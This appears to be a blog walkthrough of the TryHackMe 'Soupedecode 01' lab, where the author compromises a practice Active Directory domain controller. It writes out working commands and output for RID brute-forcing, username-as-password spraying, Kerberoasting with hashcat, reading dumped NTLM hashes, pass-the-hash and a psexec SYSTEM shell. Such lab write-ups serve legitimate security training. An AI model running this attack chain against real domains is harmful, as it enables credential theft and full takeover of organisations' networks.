---
title: Soupedecode 01 - TryHackMe - Walkthrough
date: 2025-08-02 10:00:00 +0200
categories: [TryHackMe]
tags: [active-directory,kerberos, enumeration, hashcat]
description: Exploit a AD server and become domain admin.
image:
  path: /assets/blog/Soupedecode-01/logo.png
  alt: Room Logo
---

## Intro

This is a Write-Up for the [Soupedecode 01](https://tryhackme.com/room/soupedecode01) challenge on TryHackMe. The challenge is rated as easy.

## Reconnaissance

As always I started with a extensive port scan to see the attack surface of the server.

```terminal
sudo nmap -p- -sV -sC -oA nmap/machine -vv 10.10.99.112
```

The result shows 17 ports open (output shortened):
```
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-08-02 19:46:35Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
|_ssl-date: 2025-08-02T19:48:04+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=DC01.SOUPEDECODE.LOCAL
| Issuer: commonName=DC01.SOUPEDECODE.LOCAL
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49675/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49723/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
````

The domain controller has SMB, kerberos, LDAP and WinRM open. Additionally the server leaks the domain name `SOUPEDECODE.LOCAL`.

I first checked the shares and if the user guest is available for share and user enumeration, which was the case. The only non standard share here is the backup share which is not accessible for the anonymous user.

```terminal
$ nxc smb 10.10.99.112 -u "guests" -p "" --shares
SMB         10.10.99.112    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.99.112    445    DC01             [+] SOUPEDECODE.LOCAL\guests: (Guest)
SMB         10.10.99.112    445    DC01             [*] Enumerated shares
SMB         10.10.99.112    445    DC01             Share           Permissions     Remark
SMB         10.10.99.112    445    DC01             -----           -----------     ------
SMB         10.10.99.112    445    DC01             ADMIN$                          Remote Admin
SMB         10.10.99.112    445    DC01             backup                          
SMB         10.10.99.112    445    DC01             C$                              Default share
SMB         10.10.99.112    445    DC01             IPC$            READ            Remote IPC
SMB         10.10.99.112    445    DC01             NETLOGON                        Logon server share 
SMB         10.10.99.112    445    DC01             SYSVOL                          Logon server share 
SMB         10.10.99.112    445    DC01             Users 
```

The next step is now to enumerate for usernames. This can be done using different methods and heavily depends on the configuration of the domain controller. I usually start by checking whether it is possible to enumerate the users using a LDAP query using the guest user.

```
$nxc ldap 10.10.99.112 -u "guests" -p "" --users
SMB         10.10.99.112    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
LDAP        10.10.99.112    389    DC01             [-] Error in searchRequest -> operationsError: 000004DC: LdapErr: DSID-0C090A58, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v4f7c
LDAP        10.10.99.112    389    DC01             [+] SOUPEDECODE.LOCAL\guests: 
LDAP        10.10.99.112    389    DC01             [-] Error in searchRequest -> operationsError: 000004DC: LdapErr: DSID-0C090A58, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v4f7c
```

This shows that authentication fails to retrieve the usernames. The next approach would be to brute force RIDs and this way find users. Our tool, netexec, will try to retrieve the username using the RID.

```terminal
$nxc smb 10.10.99.112 -u "guests" -p "" --rid-brute
SMB         10.10.99.112    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.99.112    445    DC01             [+] SOUPEDECODE.LOCAL\guests: (Guest)
SMB         10.10.99.112    445    DC01             498: SOUPEDECODE\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.99.112    445    DC01             500: SOUPEDECODE\Administrator (SidTypeUser)
SMB         10.10.99.112    445    DC01             501: SOUPEDECODE\Guest (SidTypeUser)
SMB         10.10.99.112    445    DC01             502: SOUPEDECODE\krbtgt (SidTypeUser)
...
```

This method works and returns a massive amount of users. To output the huge amount of users with additional information to a file, you can use `awk`.

```
$nxc smb 10.10.99.112 -u "guests" -p "" --rid-brute | awk '{split($6,a,"\\"); print a[2]}' > users.txt
```

## User

Next I checked if any user uses their username as their password. After a massive amount of guest users you can find one user which uses their username as the password.

```terminal
$nxc smb 10.10.99.112 -u users.txt -p users.txt --no-bruteforce --continue-on-success
SMB         10.10.99.112    445    DC01             [-] SOUPEDECODE.LOCAL\jiris25:jiris25 STATUS_LOGON_FAILURE 
SMB         10.10.99.112    445    DC01             [-] SOUPEDECODE.LOCAL\colivia26:colivia26 STATUS_LOGON_FAILURE 
SMB         10.10.99.112    445    DC01             [-] SOUPEDECODE.LOCAL\pyvonne27:pyvonne27 STATUS_LOGON_FAILURE 
SMB         10.10.99.112    445    DC01             [-] SOUPEDECODE.LOCAL\zfrank28:zfrank28 STATUS_LOGON_FAILURE 
SMB         10.10.99.112    445    DC01             [+] SOUPEDECODE.LOCAL\FAKE:FAKE 
SMB         10.10.99.112    445    DC01             [-] SOUPEDECODE.LOCAL\file_svc:file_svc STATUS_LOGON_FAILURE 
SMB         10.10.99.112    445    DC01             [-] SOUPEDECODE.LOCAL\charlie:charlie STATUS_LOGON_FAILURE 
SMB         10.10.99.112    445    DC01             [-] SOUPEDECODE.LOCAL\qethan32:qethan32 STATUS_LOGON_FAILURE 
SMB         10.10.99.112    445    DC01             [-] SOUPEDECODE.LOCAL\khenry33:khenry33 STATUS_LOGON_FAILURE 
SMB         10.10.99.112    445    DC01             [-] SOUPEDECODE.LOCAL\sjudy34:sjudy34 STATUS_LOGON_FAILURE 
SMB         10.10.99.112    445    DC01             [-] SOUPEDECODE.LOCAL\rrachel35:rrachel35 STATUS_LOGON_FAILURE 
```

To see how to proceed you can use the credentials to scan for the shares.
```terminal
$nxc smb 10.10.99.112 -u "FAKE" -p "FAKE" --shares
SMB         10.10.99.112    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.99.112    445    DC01             [+] SOUPEDECODE.LOCAL\FAKE:FAKE 
SMB         10.10.99.112    445    DC01             [*] Enumerated shares
SMB         10.10.99.112    445    DC01             Share           Permissions     Remark
SMB         10.10.99.112    445    DC01             -----           -----------     ------
SMB         10.10.99.112    445    DC01             ADMIN$                          Remote Admin
SMB         10.10.99.112    445    DC01             backup                          
SMB         10.10.99.112    445    DC01             C$                              Default share
SMB         10.10.99.112    445    DC01             IPC$            READ            Remote IPC
SMB         10.10.99.112    445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.99.112    445    DC01             SYSVOL          READ            Logon server share 
SMB         10.10.99.112    445    DC01             Users           READ
```

The Users share is readable to the user we found so with the credentials you may read the user flag. I used the impacket SMB client to check if the user flag is accessible.

```terminal
$impacket-smbclient 10.10.99.112/FAKE:FAKE@10.10.99.112
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Type help for list of commands
# shares
ADMIN$
backup
C$
IPC$
NETLOGON
SYSVOL
Users
# use Users
# ls
drw-rw-rw-          0  Thu Jul  4 22:48:22 2024 .
drw-rw-rw-          0  Wed Jun 18 22:14:47 2025 ..
drw-rw-rw-          0  Thu Jul  4 22:49:01 2024 admin
drw-rw-rw-          0  Sat Aug  2 19:54:39 2025 Administrator
drw-rw-rw-          0  Sun Jun 16 03:49:29 2024 All Users
drw-rw-rw-          0  Sun Jun 16 02:51:08 2024 Default
drw-rw-rw-          0  Sun Jun 16 03:49:29 2024 Default User
-rw-rw-rw-        174  Sun Jun 16 03:46:32 2024 desktop.ini
drw-rw-rw-          0  Sat Jun 15 17:54:32 2024 Public
drw-rw-rw-          0  Mon Jun 17 17:24:32 2024 FAKE
# cd FAKE
# cd Desktop
# ls
drw-rw-rw-          0  Fri Jul 25 17:51:44 2025 .
drw-rw-rw-          0  Mon Jun 17 17:24:32 2024 ..
-rw-rw-rw-        282  Mon Jun 17 17:24:32 2024 desktop.ini
-rw-rw-rw-         33  Fri Jul 25 17:51:44 2025 user.txt
# get user.txt
```

## Root

For escalating privileges you can follow the description of the room and check for any kerberoastable users. I used impacket for this task again:
```terminal
$impacket-GetUserSPNs SOUPEDECODE.LOCAL/FAKE:FAKE -dc-ip 10.10.46.83 -outputfile hashes_kerberos.txt
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

ServicePrincipalName    Name            MemberOf  PasswordLastSet             LastLogon  Delegation 
----------------------  --------------  --------  --------------------------  ---------  ----------
FTP/FileServer          file_svc                  2024-06-17 17:32:23.726085  <never>               
FW/ProxyServer          firewall_svc              2024-06-17 17:28:32.710125  <never>               
HTTP/BackupServer       backup_svc                2024-06-17 17:28:49.476511  <never>               
HTTP/WebServer          web_svc                   2024-06-17 17:29:04.569417  <never>               
HTTPS/MonitoringServer  monitoring_svc            2024-06-17 17:29:18.511871  <never>               
```

Running `hashcat` over the extracted hashes will result in one cracked hash. 

```terminal
$hashcat hashes.txt rockyou.txt
$krb5tgs$23$*file_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL/file_svc*$e27f725109a6a00a8e0f5687ca9e3545$<hash>:FOUNDPASSWORD
```

Finally this user is able to read the backup share.

```terminal
$nxc smb 10.10.46.83  -u "file_svc" -p 'FAKE' --shares
SMB         10.10.46.83     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.46.83     445    DC01             [+] SOUPEDECODE.LOCAL\file_svc:FAKE
SMB         10.10.46.83     445    DC01             [*] Enumerated shares
SMB         10.10.46.83     445    DC01             Share           Permissions     Remark
SMB         10.10.46.83     445    DC01             -----           -----------     ------
SMB         10.10.46.83     445    DC01             ADMIN$                          Remote Admin
SMB         10.10.46.83     445    DC01             backup          READ            
SMB         10.10.46.83     445    DC01             C$                              Default share
SMB         10.10.46.83     445    DC01             IPC$            READ            Remote IPC
SMB         10.10.46.83     445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.46.83     445    DC01             SYSVOL          READ            Logon server share 
SMB         10.10.46.83     445    DC01             Users
```

There is only one file in the share:
```terminal
$impacket-smbclient 10.10.99.112/file_svc:'FAKE'@10.10.46.83
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Type help for list of commands
# shares
ADMIN$
backup
C$
IPC$
NETLOGON
SYSVOL
Users
# use backup
# ls
drw-rw-rw-          0  Mon Jun 17 17:41:17 2024 .
drw-rw-rw-          0  Fri Jul 25 17:51:20 2025 ..
-rw-rw-rw-        892  Mon Jun 17 17:41:23 2024 backup_extract.txt
# get backup_extract.txt
```

If you print the file you will be greeted with a massive amount fo hashes.

```terminal
$cat backup_extract.txt 
WebServer$:2119:<HASH>:<HASH>:::
DatabaseServer$:2120:<HASH>:<HASH>:::
CitrixServer$:2122:<HASH>:<HASH>:::
FileServer$:2065:<HASH>:<HASH>:::
MailServer$:2124:<HASH>:<HASH>:::
BackupServer$:2125:<HASH>:<HASH>:::
ApplicationServer$:2126:<HASH>:<HASH>:::
PrintServer$:2127:<HASH>:<HASH>:::
ProxyServer$:2128:<HASH>:<HASH>:::
MonitoringServer$:2129:<HASH>:<HASH>:::
```

As we have the hashes of the users we can try to login to these accounts. For that we can generate two wordlists. One wordlist are the NTLM hashes, the other wordlist is the user wordlist with the usernames.

```terminal
cat backup_extract.txt | awk -F\: '{ print $4}' > hashes.txt
cat backup_extract.txt | awk -F\: '{ print $1}' > users_hashes.txt
```

Now you can try if any hash and user combination works using netexec.

```terminal
$nxc smb 10.10.38.87 -u users_hashes.txt -H hashes.txt  --no-bruteforce
SMB         10.10.38.87     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.38.87     445    DC01             [-] SOUPEDECODE.LOCAL\WebServer$:c47b45f5d4df5a494bd19f13e14f7902 STATUS_LOGON_FAILURE 
SMB         10.10.38.87     445    DC01             [-] SOUPEDECODE.LOCAL\DatabaseServer$:406b424c7b483a42458bf6f545c936f7 STATUS_LOGON_FAILURE 
SMB         10.10.38.87     445    DC01             [-] SOUPEDECODE.LOCAL\CitrixServer$:48fc7eca9af236d7849273990f6c5117 STATUS_LOGON_FAILURE
LOCAL\FileServer$:HASH (Pwn3d!)
```

Finally because netexec already shows `Pwn3d!` we can WinRM into the machine. I used the `psexec` utility from impacket for that.

```terminal
$impacket-psexec -hashes ":HASH" SOUPEDECODE.LOCAL/'Fileserver$'@10.10.38.87
C:\Windows\system32> whoami /all                  

USER INFORMATION
----------------

User Name           SID     
=================== ========
nt authority\system S-1-5-18


GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes                                        
====================================== ================ ============ ==================================================
BUILTIN\Administrators                 Alias            S-1-5-32-544 Enabled by default, Enabled group, Group owner    
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
Mandatory Label\System Mandatory Level Label            S-1-16-16384                                                   


PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State   
========================================= ================================================================== ========
SeAssignPrimaryTokenPrivilege             Replace a process level token                                      Disabled
SeLockMemoryPrivilege                     Lock pages in memory                                               Enabled 
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
SeTcbPrivilege                            Act as part of the operating system                                Enabled 
SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled 
SeSystemtimePrivilege                     Change the system time                                             Disabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled 
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled 
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled 
SeCreatePermanentPrivilege                Create permanent shared objects                                    Enabled 
SeBackupPrivilege                         Back up files and directories                                      Disabled
SeRestorePrivilege                        Restore files and directories                                      Disabled
SeShutdownPrivilege                       Shut down the system                                               Disabled
SeDebugPrivilege                          Debug programs                                                     Enabled 
SeAuditPrivilege                          Generate security audits                                           Enabled 
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled 
SeUndockPrivilege                         Remove computer from docking station                               Disabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled 
SeCreateGlobalPrivilege                   Create global objects                                              Enabled 
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled 
SeTimeZonePrivilege                       Change the time zone                                               Enabled 
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled 
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled 

ERROR: Unable to get user claims information.

```

The output tells us that our current user is already part of the Administrators group so we won't need any further privilege escalation and can proceed to finally print the flag.

```terminal
C:\Windows\system32> cd C:\Users\Administrator\Desktop

C:\Users\Administrator\Desktop> dir
 Volume in drive C has no label.
 Volume Serial Number is CCB5-C4FB

 Directory of C:\Users\Administrator\Desktop

07/25/2025  10:51 AM    <DIR>          .
08/02/2025  02:06 PM    <DIR>          ..
06/17/2024  10:41 AM    <DIR>          backup
07/25/2025  10:51 AM                33 root.txt
               1 File(s)             33 bytes
               3 Dir(s)  43,430,887,424 bytes free

```
